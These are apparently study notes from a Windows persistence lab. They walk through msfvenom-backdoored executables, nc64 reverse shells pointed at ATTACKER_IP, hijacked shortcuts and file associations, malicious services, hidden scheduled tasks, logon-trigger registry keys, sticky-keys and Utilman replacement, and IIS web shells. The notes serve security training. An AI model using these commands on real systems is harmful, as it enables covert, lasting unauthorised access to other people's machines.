## **Backdooring Files**

### Executable Files
If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:
```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

 **`-a x64`**:
- **Architecture flag**. It specifies the target architecture.
- In this case, `x64` means the payload will target **64-bit** Windows systems.

 **`--platform windows`**:
- This specifies the **target platform** as **Windows**. It tells `msfvenom` that the payload is for a Windows operating system.

 **`-x putty.exe`**:
- **Template executable**. This option is used to specify the **legitimate executable** file (in this case, `putty.exe`) into which the payload will be injected.
- **`putty.exe`** is a common SSH and telnet client for Windows, which is being used here as the template executable.

 **`-k`**:
- **Keep original functionality**. This flag ensures that the original functionality of the file (`putty.exe`) is **preserved**, so it will still run as expected after the payload is embedded.
- The file will run the original program **and** the injected payload.

 **`-p windows/x64/shell_reverse_tcp`**:
- **Payload to be injected**. The `-p` flag specifies the payload.
- In this case, the `windows/x64/shell_reverse_tcp` payload is used, which opens a **reverse shell** on the victim's machine. This means the victim's machine will initiate a connection back to the attacker's system.
- A **reverse shell** allows the attacker to execute commands remotely on the victim’s system once the connection is established.

**`lhost=ATTACKER_IP`**:
- **Local Host**. This specifies the **IP address** of the attacker's machine where the reverse shell will connect to.
- You would replace `ATTACKER_IP` with your **attacking machine's IP address** (e.g., `192.168.1.100`).

 **`lport=4444`**:
- **Local Port**. This specifies the **port number** on the attacker's machine that will be used to listen for incoming connections from the reverse shell.
- In this case, port `4444` is commonly used, but it can be changed to any available port on the attacker's machine.

 **`-b "\x00"`**:
- **Bad characters**. The `-b` flag specifies **bad characters** that should not be included in the payload.
- In this case, `"\x00"` (null byte) is specified as a bad character because it can terminate strings prematurely in many programming contexts, leading to payload issues.

 **`-f exe`**:
- **Format**. The `-f` flag specifies the format of the output file.
- Here, `exe` means the output will be a **Windows executable file**.

 **`-o puttyX.exe`**:
- **Output file**. The `-o` flag is used to specify the **output file name**.
- In this case, the modified, malicious executable will be saved as `puttyX.exe`.

### Shortcut Files
If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:
	![[Pasted image 20240910022812.png]]

Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:
```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```
![[Pasted image 20240910022927.png]]

Start an nc listener to receive our reverse shell on our attacker's machine:
```shell-session
user@AttackBox$ nc -lvp 4445
```

### Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:
	![[Pasted image 20240910024802.png]]

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:
	![[Pasted image 20240910024828.png]]

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```
Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

Change the registry key to run our backdoor script in a hidden window:
	![[Pasted image 20240910024925.png]]

Start an nc listener to receive our reverse shell on our attacker's machine:
```shell-session
user@AttackBox$ nc -lvp 4445
```

## **Abusing Services**
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.
### Creating backdoor services
We can create and start a service named "THMservice" using the following commands:
```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note:** 
	There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:
```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```
 ![[Pasted image 20240910033314.png]]

Copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:
```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

### Modifying existing services
While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:
```shell-session
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
```shell-session
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service for persistence:
- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The service **START_TYPE** should be automatic so that the payload runs without user interaction.
- The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:
```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

```
python3 -m http.server 8000
```

```
wget -P "C:\path\to\directory" http://<your-ip-address>:8000/yourfile.exe
```

 Reconfigure "THMservice3" parameters, we can use the following command:
```shell-session
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Then query the service's configuration again to check if all went as expected:
```shell-session
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

## **Abusing Scheduled Tasks**
### Task Scheduler
The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often.
```shell-session
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

This command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.
```shell-session
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

**Making Our Task Invisible:**
Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. 
You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:
```shell-session
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:
	![[Pasted image 20240911024459.png]]

If we try to query our service again, the system will tell us there is no such task:
```shell-session
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

## **Logon Triggered Persistence**
Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
### Startup folder
Each user has a folder under
`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

```shell-session
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```shell-session
PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.
```shell-session
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

### Run / RunOnce
You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it to `C:\Windows\`
```shell-session
C:\> move revshell.exe C:\Windows
```

Create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. 
The entry's name can be anything you like, and the value will be the command we want to execute.

### Winlogon
Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.
![[Pasted image 20240911025546.png]]

Note:
	If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

```shell-session
C:\> move revshell.exe C:\Windows
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.
		![[Pasted image 20240911025808.png]]

### Logon scripts
One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Note:
	Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

```shell-session
C:\> move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:
		![[Pasted image 20240911030030.png]]

Note:
	Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.

## **Backdooring the Login Screen / RDP**
If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

### Sticky Keys
When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
		![[Pasted image 20240911031921.png]]

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
```shell-session
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

### Utilman
Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
		![[Pasted image 20240911032130.png]]

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again. 

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
```shell-session
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

## **Persisting Through Existing Services**
If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoor-able similarly. The possibilities are endless!

### Web Shells
The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. 

Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. 

Start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```shell-session
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:**
	Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL: `http://MACHINE_IP/shell.aspx`
	![[Pasted image 20240911033854.png]]

Note:
	While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert!
